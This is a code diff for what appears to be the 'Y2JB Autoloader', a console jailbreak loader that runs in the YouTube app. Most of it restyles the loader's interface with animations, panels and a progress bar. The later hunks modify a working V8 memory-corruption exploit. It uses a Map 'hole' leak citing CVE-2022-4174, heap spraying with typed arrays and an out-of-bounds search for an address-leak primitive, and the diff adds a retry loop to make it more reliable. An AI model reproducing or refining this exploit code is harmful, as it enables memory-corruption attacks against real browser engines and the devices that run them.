@@ -152,15 +152,49 @@ function trigger() {
         }
     };
 
+    window.inject_ui_style = function() {
+        if (document.getElementById("nl_style")) return;
+        const style = document.createElement("style");
+        style.id = "nl_style";
+        style.textContent = [
+            "@keyframes nlFadeIn { from { opacity:0; transform: translateY(8px);} to { opacity:1; transform:none;} }",
+            "@keyframes nlGlow { 0%,100% { text-shadow: 0 0 24px rgba(0,229,255,.85), 0 0 60px rgba(0,229,255,.35);} 50% { text-shadow: 0 0 30px rgba(255,43,214,.85), 0 0 70px rgba(255,43,214,.40);} }",
+            "@keyframes nlPulse { 0%,100% { opacity:1; transform: scale(1);} 50% { opacity:.35; transform: scale(.7);} }",
+            "@keyframes nlShimmer { 0% { background-position: 0% 0;} 100% { background-position: 300% 0;} }",
+            "@keyframes nlDriftA { 0%,100% { transform: translate(0,0) scale(1);} 50% { transform: translate(120px,-80px) scale(1.15);} }",
+            "@keyframes nlDriftB { 0%,100% { transform: translate(0,0) scale(1);} 50% { transform: translate(-140px,90px) scale(1.1);} }",
+            "@keyframes nlScan { 0% { top:-15%;} 100% { top:115%;} }",
+            "#nl_bg { position:absolute; top:0; left:0; width:1920px; height:1080px; background-image:url('background.png'); background-size:cover; background-position:center; z-index:0; }",
+            "#nl_vignette { position:absolute; top:0; left:0; width:1920px; height:1080px; background:linear-gradient(180deg, rgba(2,3,16,.78) 0%, rgba(2,3,16,.42) 45%, rgba(2,3,16,.85) 100%); z-index:1; }",
+            "#nl_auraA { position:absolute; top:60px; left:-100px; width:820px; height:820px; border-radius:50%; background:radial-gradient(circle, rgba(0,229,255,.22) 0%, rgba(0,229,255,0) 65%); z-index:1; animation:nlDriftA 14s ease-in-out infinite; }",
+            "#nl_auraB { position:absolute; bottom:-160px; right:-120px; width:900px; height:900px; border-radius:50%; background:radial-gradient(circle, rgba(255,43,214,.20) 0%, rgba(255,43,214,0) 65%); z-index:1; animation:nlDriftB 17s ease-in-out infinite; }",
+            "#nl_scan { position:absolute; left:0; width:100%; height:14%; background:linear-gradient(180deg, rgba(0,229,255,0) 0%, rgba(0,229,255,.05) 50%, rgba(0,229,255,0) 100%); z-index:2; animation:nlScan 9s linear infinite; }",
+            ".nl_glass { background:rgba(6,10,26,.72); border:1px solid rgba(0,229,255,.35); border-radius:18px; box-shadow:0 0 34px rgba(0,229,255,.18), inset 0 0 60px rgba(0,229,255,.04); }",
+            ".nl_entry { animation:nlFadeIn .25s ease-out; }"
+        ].join("\n");
+        document.head.appendChild(style);
+    };
+
     window.autoloader_ui = function() {
         if (document.getElementById("autoloader_ui")) {
             const existing_ui = document.getElementById("autoloader_ui");
             existing_ui.parentNode.removeChild(existing_ui);
         }
+        window.inject_ui_style();
 
         const baseWidth = 1920;
         const baseHeight = 1080;
         const scale = window.innerWidth / baseWidth;
+
+        // Background image with graceful fallback to a deep-space gradient
+        const bgProbe = new Image();
+        bgProbe.onerror = function() {
+            const bg = document.getElementById("nl_bg");
+            if (bg) {
+                bg.style.backgroundImage = "linear-gradient(135deg, #05010f 0%, #0b1030 45%, #1a0a2e 100%)";
+            }
+        };
+        bgProbe.src = "background.png";
 
         const autoloader_ui = document.createElement("div");
         autoloader_ui.id = "autoloader_ui";
@@ -172,39 +206,114 @@ function trigger() {
         autoloader_ui.style.transform = "scale(" + scale + ")";
         autoloader_ui.style.transformOrigin = "top left";
         autoloader_ui.style.zIndex = "9999";
-        autoloader_ui.style.backgroundColor = "#272727";
-        autoloader_ui.style.border = "1px solid black";
-        autoloader_ui.style.padding = "5px";
+        autoloader_ui.style.overflow = "hidden";
+        autoloader_ui.style.backgroundColor = "#05010f";
         autoloader_ui.style.fontFamily = "Arial, sans-serif";
-        autoloader_ui.style.fontSize = "8px";
+        autoloader_ui.style.padding = "0px";
 
+        // Scenic layers
+        const bg = document.createElement("div");
+        bg.id = "nl_bg";
+        autoloader_ui.appendChild(bg);
+
+        const vignette = document.createElement("div");
+        vignette.id = "nl_vignette";
+        autoloader_ui.appendChild(vignette);
+
+        const auraA = document.createElement("div");
+        auraA.id = "nl_auraA";
+        autoloader_ui.appendChild(auraA);
+
+        const auraB = document.createElement("div");
+        auraB.id = "nl_auraB";
+        autoloader_ui.appendChild(auraB);
+
+        const scan = document.createElement("div");
+        scan.id = "nl_scan";
+        autoloader_ui.appendChild(scan);
+
+        // Orbital icon badge
+        const badge = document.createElement("div");
+        badge.style.position = "absolute";
+        badge.style.top = "64px";
+        badge.style.left = "50%";
+        badge.style.transform = "translateX(-50%)";
+        badge.style.width = "118px";
+        badge.style.height = "118px";
+        badge.style.borderRadius = "50%";
+        badge.style.backgroundImage = "url('icon0.png')";
+        badge.style.backgroundSize = "cover";
+        badge.style.backgroundPosition = "center";
+        badge.style.border = "2px solid rgba(0,229,255,.65)";
+        badge.style.boxShadow = "0 0 40px rgba(0,229,255,.45), inset 0 0 28px rgba(0,0,0,.55)";
+        badge.style.zIndex = "3";
+        autoloader_ui.appendChild(badge);
+
+        // Title
         const title = document.createElement("div");
-        title.textContent = "Y2JB Autoloader";
-        title.style.fontFamily = "monospace";
+        title.textContent = "Y2JB AUTOLOADER";
+        title.style.position = "absolute";
+        title.style.top = "196px";
+        title.style.left = "0px";
+        title.style.width = "100%";
         title.style.textAlign = "center";
         title.style.fontWeight = "bold";
-        title.style.color = "#ccc";
-        title.style.padding = "10px";
-        title.style.borderRadius = "8px";
-        title.style.marginBottom = "5px";
-        title.style.fontSize = "42px";
-        title.style.marginTop = "60px";
+        title.style.color = "#eaf6ff";
+        title.style.fontSize = "74px";
+        title.style.letterSpacing = "14px";
+        title.style.zIndex = "3";
+        title.style.animation = "nlGlow 4s ease-in-out infinite";
         autoloader_ui.appendChild(title);
 
+        // Status chip
+        const chip = document.createElement("div");
+        chip.id = "nl_chip";
+        chip.style.position = "absolute";
+        chip.style.top = "316px";
+        chip.style.left = "50%";
+        chip.style.transform = "translateX(-50%)";
+        chip.style.padding = "12px 34px";
+        chip.style.borderRadius = "30px";
+        chip.style.background = "rgba(6,10,26,.8)";
+        chip.style.border = "1px solid rgba(0,229,255,.5)";
+        chip.style.color = "#9fe8ff";
+        chip.style.fontSize = "26px";
+        chip.style.letterSpacing = "3px";
+        chip.style.zIndex = "3";
+        chip.className = "nl_glass";
+        const chipDot = document.createElement("div");
+        chipDot.id = "nl_chip_dot";
+        chipDot.style.position = "absolute";
+        chipDot.style.left = "18px";
+        chipDot.style.top = "50%";
+        chipDot.style.transform = "translateY(-50%)";
+        chipDot.style.width = "14px";
+        chipDot.style.height = "14px";
+        chipDot.style.borderRadius = "50%";
+        chipDot.style.backgroundColor = "#00e5ff";
+        chipDot.style.boxShadow = "0 0 14px rgba(0,229,255,.9)";
+        chipDot.style.animation = "nlPulse 1.4s ease-in-out infinite";
+        chipDot.style.marginLeft = "16px";
+        chip.textContent = "INITIALISATION...";
+        chip.appendChild(chipDot);
+        autoloader_ui.appendChild(chip);
+
+        // Log panel (glass)
         const logWrapper = document.createElement("div");
-        logWrapper.style.width = "62%";
-        logWrapper.style.height = "62%";        
-        logWrapper.style.position = "relative";
-        logWrapper.style.margin = "20px auto 0 auto";
-        logWrapper.style.padding = "0px";
-        logWrapper.style.color = "#ccc";
-        logWrapper.style.backgroundColor = "#000";
+        logWrapper.style.width = "940px";
+        logWrapper.style.height = "440px";
+        logWrapper.style.position = "absolute";
+        logWrapper.style.top = "400px";
+        logWrapper.style.left = "50%";
+        logWrapper.style.transform = "translateX(-50%)";
+        logWrapper.style.color = "#9fb3d1";
         logWrapper.style.fontFamily = "monospace";
-        logWrapper.style.fontSize = "28px";
+        logWrapper.style.fontSize = "24px";
         logWrapper.style.overflow = "hidden";
-        logWrapper.style.border = "2px solid red";
-        logWrapper.style.borderRadius = "8px";
         logWrapper.style.overflowY = "scroll";
+        logWrapper.style.padding = "10px 0px";
+        logWrapper.style.zIndex = "3";
+        logWrapper.className = "nl_glass";
         logWrapper.id = "logWrapper";
         autoloader_ui.appendChild(logWrapper);
 
@@ -212,43 +321,79 @@ function trigger() {
         logContainer.id = "logContainer";
         logContainer.style.position = "absolute";
         logContainer.style.bottom = "0";
-        logContainer.style.padding = "10px";
+        logContainer.style.left = "0";
+        logContainer.style.width = "100%";
+        logContainer.style.padding = "14px 22px";
         logWrapper.appendChild(logContainer);
 
+        // Progress rail
         const progressBarContainer = document.createElement("div");
-        progressBarContainer.style.width = "60%";
-        progressBarContainer.style.height = "100px";
-        progressBarContainer.style.backgroundColor = "#202020";
-        progressBarContainer.style.border = "2px solid red";
-        progressBarContainer.style.borderRadius = "16px";
-        progressBarContainer.style.margin = "0 auto";
+        progressBarContainer.style.width = "940px";
+        progressBarContainer.style.height = "64px";
+        progressBarContainer.style.position = "absolute";
+        progressBarContainer.style.top = "876px";
+        progressBarContainer.style.left = "50%";
+        progressBarContainer.style.transform = "translateX(-50%)";
         progressBarContainer.style.overflow = "hidden";
         progressBarContainer.style.position = "relative";
-        progressBarContainer.style.marginTop = "30px";
+        progressBarContainer.style.zIndex = "3";
+        progressBarContainer.className = "nl_glass";
         autoloader_ui.appendChild(progressBarContainer);
-
-        const progressLabel = document.createElement("div");
-        progressLabel.id = "progressLabel";
-        progressLabel.textContent = "Loading...";
-        progressLabel.style.position = "absolute";
-        progressLabel.style.top = "50%";
-        progressLabel.style.left = "50%";
-        progressLabel.style.transform = "translate(-50%, -50%)";
-        progressLabel.style.color = "#fff";
-        progressLabel.style.fontSize = "42px";
-        progressLabel.style.fontWeight = "bold";
-        progressLabel.style.zIndex = "1";
-        progressBarContainer.appendChild(progressLabel);
 
         const progressBar = document.createElement("div");
         progressBar.id = "progressBar";
         progressBar.style.width = "100%";
         progressBar.style.height = "100%";
-        progressBar.style.backgroundColor = "#aa0000";
+        progressBar.style.background = "linear-gradient(90deg, #00e5ff, #7aa8ff, #ff2bd6, #00e5ff)";
+        progressBar.style.backgroundSize = "300% 100%";
         progressBar.style.transformOrigin = "left";
         progressBar.style.transform = "scaleX(0)";
-        progressBar.style.transition = "transform 0.5s ease-in-out";
+        progressBar.style.opacity = "0.92";
+        progressBar.style.animation = "nlShimmer 3.5s linear infinite";
         progressBarContainer.appendChild(progressBar);
+
+        const progressLabel = document.createElement("div");
+        progressLabel.id = "progressLabel";
+        progressLabel.textContent = "LOADING...";
+        progressLabel.style.position = "absolute";
+        progressLabel.style.top = "50%";
+        progressLabel.style.left = "50%";
+        progressLabel.style.transform = "translate(-50%, -50%)";
+        progressLabel.style.color = "#ffffff";
+        progressLabel.style.fontSize = "28px";
+        progressLabel.style.fontWeight = "bold";
+        progressLabel.style.letterSpacing = "2px";
+        progressLabel.style.textShadow = "0 0 12px rgba(0,0,0,.9), 0 0 24px rgba(0,229,255,.5)";
+        progressLabel.style.zIndex = "1";
+        progressBarContainer.appendChild(progressLabel);
+
+        const progressPct = document.createElement("div");
+        progressPct.id = "progressPct";
+        progressPct.textContent = "0%";
+        progressPct.style.position = "absolute";
+        progressPct.style.top = "896px";
+        progressPct.style.left = "0px";
+        progressPct.style.width = "100%";
+        progressPct.style.textAlign = "center";
+        progressPct.style.color = "#7dd7ff";
+        progressPct.style.fontSize = "22px";
+        progressPct.style.letterSpacing = "4px";
+        progressPct.style.zIndex = "3";
+        autoloader_ui.appendChild(progressPct);
+
+        // Footer
+        const footer = document.createElement("div");
+        footer.textContent = "by PLK  \u2022  fork of Y2JB by Gezine";
+        footer.style.position = "absolute";
+        footer.style.bottom = "26px";
+        footer.style.left = "0px";
+        footer.style.width = "100%";
+        footer.style.textAlign = "center";
+        footer.style.color = "rgba(159,179,209,.65)";
+        footer.style.fontSize = "20px";
+        footer.style.letterSpacing = "2px";
+        footer.style.zIndex = "3";
+        autoloader_ui.appendChild(footer);
 
         document.body.appendChild(autoloader_ui);
     };
@@ -262,6 +407,20 @@ function trigger() {
         if (progressLabel) {
             progressLabel.textContent = message;
         }
+        const progressPct = document.getElementById("progressPct");
+        if (progressPct) {
+            progressPct.textContent = percent + "%";
+        }
+        const chipDot = document.getElementById("nl_chip_dot");
+        if (chipDot) {
+            chipDot.style.backgroundColor = "#ffd166";
+            chipDot.style.boxShadow = "0 0 14px rgba(255,209,102,.9)";
+        }
+        const chip = document.getElementById("nl_chip");
+        if (chip && message) {
+            chip.textContent = String(message).toUpperCase();
+            chip.appendChild(chipDot);
+        }
         window.uiLog(message, "warning");
     };
 
@@ -272,18 +431,24 @@ function trigger() {
         const logContainer = document.getElementById("logContainer");
         if (logContainer) {
             const logEntry = document.createElement("div");
+            logEntry.className = "nl_entry";
             if (type === "error") {
-                logEntry.style.color = "red";
+                logEntry.style.color = "#ff4d6d";
+                logEntry.style.textShadow = "0 0 12px rgba(255,77,109,.45)";
             } else if (type === "success") {
-                logEntry.style.color = "lightgreen";
+                logEntry.style.color = "#7dff8a";
+                logEntry.style.textShadow = "0 0 12px rgba(125,255,138,.40)";
             } else if (type === "warning") {
-                logEntry.style.color = "yellow";
+                logEntry.style.color = "#ffd166";
             } else {
-                logEntry.style.color = "#ccc";
+                logEntry.style.color = "#9fb3d1";
             }
-            logEntry.textContent = message;
+            logEntry.style.marginBottom = "6px";
+            logEntry.style.whiteSpace = "nowrap";
+            logEntry.style.overflow = "hidden";
+            logEntry.textContent = "\u00BB " + message;
             logContainer.appendChild(logEntry);
-            if (logContainer.childElementCount > 20) {
+            while (logContainer.childElementCount > 20) {
                 logContainer.removeChild(logContainer.firstChild);
             }
             const logWrapper = document.getElementById("logWrapper");
@@ -318,51 +483,70 @@ function trigger() {
         // CVE-2022-4174 faster hole leak
         // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
         let hole = trigger();
-        
-        for (let i = 0; i < 0x10; i++) {
-            map1 = new Map();
-            map1.set(1, 1);
-            map1.set(hole, 1);
-            map1.delete(hole);
-            map1.delete(hole);
-            map1.delete(1);
-            oob_arr = new BigUint64Array([0x4141414141414141n]);
+        if (hole === undefined) {
+            throw new Error("Failed to trigger the hole (undefined)");
         }
-        
-        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
-        obj_arr = [{}, {}];
-
-        map1.set(0x1e, -1);
-        gc();
-        map1.set(0x0, 0x1);
-        
-        //oob_arr[31] : 0x2 -- victim_arr length
-        //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
-        //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
-        
-        await log ("oob_arr length : " + toHex(oob_arr.length));
-        
-        const oob_arr_before = [];
-        for (let i = 0; i < 100; i++) {
-            oob_arr_before[i] = oob_arr[i];
-        }
-        
-        obj_arr[0] = 0x1n;
 
         let obj_arr_offset = -1;
-        for (let i = 0; i < 100; i++) {
-            if (oob_arr[i] !== oob_arr_before[i]) {
-                obj_arr_offset = i;
-                break;
+        const MAX_PRIMITIVE_ATTEMPTS = 3;
+
+        for (let attempt = 1; attempt <= MAX_PRIMITIVE_ATTEMPTS && obj_arr_offset === -1; attempt++) {
+            if (attempt > 1) {
+                await log("Primitive acquisition failed, retrying (" + attempt + "/" + MAX_PRIMITIVE_ATTEMPTS + ")...");
+                // release references so GC can fully reclaim the failed heap spray
+                map1 = null;
+                oob_arr = null;
+                victim_arr = null;
+                obj_arr = null;
+                await gc();
+                await gc();
+                await gc();
+            }
+
+            for (let i = 0; i < 0x10; i++) {
+                map1 = new Map();
+                map1.set(1, 1);
+                map1.set(hole, 1);
+                map1.delete(hole);
+                map1.delete(hole);
+                map1.delete(1);
+                oob_arr = new BigUint64Array([0x4141414141414141n]);
+            }
+
+            victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
+            obj_arr = [{}, {}];
+
+            map1.set(0x1e, -1);
+            gc();
+            map1.set(0x0, 0x1);
+
+            //oob_arr[31] : 0x2 -- victim_arr length
+            //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
+            //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
+
+            await log ("oob_arr length : " + toHex(oob_arr.length));
+
+            const oob_arr_before = [];
+            for (let i = 0; i < 100; i++) {
+                oob_arr_before[i] = oob_arr[i];
+            }
+
+            obj_arr[0] = 0x1n;
+
+            for (let i = 0; i < 100; i++) {
+                if (oob_arr[i] !== oob_arr_before[i]) {
+                    obj_arr_offset = i;
+                    break;
+                }
             }
         }
 
-        //await log('obj_arr_offset : ' + obj_arr_offset);
-        
         if (obj_arr_offset === -1) {
-            throw new Error("Failed to get unstable primitive");
+            throw new Error("Failed to get unstable primitive after " + MAX_PRIMITIVE_ATTEMPTS + " attempts");
         }
-        
+
+        //await log('obj_arr_offset : ' + obj_arr_offset);
+
         await log("Unstable primitive achieved");
         
         function addrof_unstable(obj) {
@@ -1241,6 +1425,9 @@ function trigger() {
         if (typeof window.hideUI === 'function') window.hideUI();
         await log('EXCEPTION: ' + e.message);
         await log(e.stack);
+        if (typeof send_notification === 'function') {
+            send_notification("[ERROR] Y2JB exception: " + e.message);
+        }
         await kill_youtube();
     }
     
